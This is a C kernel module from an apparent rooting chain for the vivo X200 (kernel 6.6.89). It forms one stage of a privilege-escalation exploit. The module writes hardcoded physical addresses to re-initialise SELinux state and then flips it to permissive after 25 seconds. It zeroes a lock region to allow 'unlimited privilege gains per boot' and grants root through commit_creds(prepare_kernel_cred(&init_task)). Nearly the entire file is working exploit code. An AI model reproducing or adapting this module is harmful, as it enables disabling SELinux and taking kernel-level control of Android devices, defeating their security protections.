// SPDX-License-Identifier: GPL-2.0-only
// Copyright 2026 GhostLock-X200 contributors
//
// permissive_restore: delayed permissive-restore module for the GhostLock-X200 temporary
// root chain (vivo X200, PD2415, kernel 6.6.89-android15-8-gb57af212129c).
//
// Behavior (see ARCHITECTURE.md):
//   - init: restore selinux_state.initialized=1 (STAGE1 8-byte write clears it;
//           without this every newly started app crashes on setcontext),
//           zero the GL_LOCK host (__dump_skip.zeroes, gl_zeroes_p0) so the slot
//           counter restarts (unlimited privilege gains per boot), then
//           commit_creds(prepare_kernel_cred(&init_task)).
//   - worker: after 25s byte-write enforcing=0 (only the byte at P0; does not
//           touch initialized/policycap), then waits on kthread_should_stop()
//           so rmmod -> kthread_stop() never sees a freed task_struct.
//
// COMPATIBILITY: default P0 addresses are b57 empirical values; scripts
// override them per boot via module params (selinux_state_p0, gl_zeroes_p0).
//
// MODULE_LICENSE("GPL") is the loader declaration matching the source
// license: GPL-2.0-only (see LICENSES/GPL-2.0-only.txt).
#include <linux/init.h>
#include <linux/module.h>
#include <linux/cred.h>
#include <linux/delay.h>
#include <linux/kthread.h>
#include <linux/sched.h>

#define SELINUX_STATE_P0_DEFAULT 0xffffff8002346ee8ULL
#define MYROOT_DELAY_MS 25000
#define GL_ZEROES_P0_DEFAULT 0xffffff8002342820ULL   /* __dump_skip.zeroes (b57) */
#define GL_ZEROES_SIZE 4096

static unsigned long selinux_state_p0 = SELINUX_STATE_P0_DEFAULT;
module_param(selinux_state_p0, ulong, 0);
MODULE_PARM_DESC(selinux_state_p0, "selinux_state physmap address (offsets_auto 注入)");

static unsigned long gl_zeroes_p0 = GL_ZEROES_P0_DEFAULT;
module_param(gl_zeroes_p0, ulong, 0);
MODULE_PARM_DESC(gl_zeroes_p0, "GL_LOCK host (__dump_skip.zeroes) physmap addr (b57)");

static struct task_struct *myroot_task;

static int myroot_worker(void *arg)
{
    msleep(MYROOT_DELAY_MS);
    /* 字节级写: 只改 enforcing(0x0) 和 initialized(0x1), 不碰 policycap */
    *(volatile unsigned char *)(selinux_state_p0 + 1) = 1;  /* initialized */
    *(volatile unsigned char *)selinux_state_p0 = 0;        /* enforcing -> permissive */
    pr_info("myroot: selinux state fixed (enforcing=0 initialized=1)\n");
    /* 不自然退出. worker return 0 后 kthread_exit 释放 task_struct,
     * myroot_task 悬垂 -> rmmod 时 kthread_stop(悬垂) -> UAF panic.
     * 等 kthread_should_stop(): kthread_stop 置位并唤醒 -> 安全退出. */
    while (!kthread_should_stop())
        schedule_timeout_interruptible(HZ);
    return 0;
}

static int __init myroot_init(void)
{
    struct cred *new;
    volatile unsigned char *gp;
    int gi;
    /* 立即恢复 initialized=1 (STAGE1 的 8 字节写已连带清空) */
    *(volatile unsigned char *)(selinux_state_p0 + 1) = 1;
    /* 清零 GL_LOCK 宿主 -> 槽位从 0 重新开始 (无限提权) */
    gp = (volatile unsigned char *)gl_zeroes_p0;
    for (gi = 0; gi < GL_ZEROES_SIZE; gi++)
        gp[gi] = 0;
    pr_info("myroot: GL host zeroed (%d bytes @ %lx)\n",
            GL_ZEROES_SIZE, gl_zeroes_p0);
    new = prepare_kernel_cred(&init_task);
    if (!new)
        return -ENOMEM;
    commit_creds(new);
    pr_info("myroot: root granted, state=%lx, fix in %d ms\n",
            selinux_state_p0, MYROOT_DELAY_MS);

    myroot_task = kthread_run(myroot_worker, NULL, "myroot_permissive");
    if (IS_ERR(myroot_task)) {
        pr_err("myroot: kthread_run failed %ld\n", PTR_ERR(myroot_task));
        myroot_task = NULL;
    }
    return 0;
}

static void __exit myroot_exit(void)
{
    if (myroot_task)
        kthread_stop(myroot_task);
    pr_info("myroot: unloaded\n");
}

module_init(myroot_init);
module_exit(myroot_exit);
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("VIVO X200 delayed permissive helper (parametrized P0)");
